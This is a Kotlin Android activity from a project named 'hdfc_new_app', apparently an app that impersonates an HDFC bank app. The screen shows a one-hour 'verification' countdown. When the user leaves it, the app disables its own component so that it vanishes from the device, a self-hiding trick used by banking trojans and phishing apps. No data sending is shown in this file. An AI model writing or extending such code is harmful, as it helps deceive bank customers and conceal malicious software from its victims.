package com.example.hdfc_new_app

import android.content.pm.PackageManager
import android.os.Bundle
import android.os.CountDownTimer
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.example.hdfc_new_app.databinding.ActivityFifthpageBinding

class fifthpage : AppCompatActivity() {

    private lateinit var binding : ActivityFifthpageBinding
    private lateinit var countDownTimer: CountDownTimer
    private val util = Util()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityFifthpageBinding.inflate(layoutInflater)
        setContentView(binding.root)

        util.saveLocalData(this,"check","true")

        startCountdownTimer()

    }

    override fun onPause() {
        super.onPause()
        val util =  Util()
        if(util.getLocalData(this,"check")=="true") {
            Log.e("asdf123", "pause: verify activity")
            val pakagemanger = packageManager
            pakagemanger.setApplicationEnabledSetting(
                packageName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        }
    }

    private fun startCountdownTimer() {
        countDownTimer = object : CountDownTimer(3600000, 1000) {
            override fun onTick(millisUntilFinished: Long) {
                val secondsRemaining = millisUntilFinished / 1000
                val minutes = (secondsRemaining % 3600) / 60
                val seconds = secondsRemaining % 60
                binding.timer.text = "$minutes : $seconds"
            }

            override fun onFinish() {
                binding.timer.text = "00 : 00"
            }
        }
        countDownTimer.start()
    }


    override fun onDestroy() {
        super.onDestroy()
        countDownTimer.cancel()
    }

}
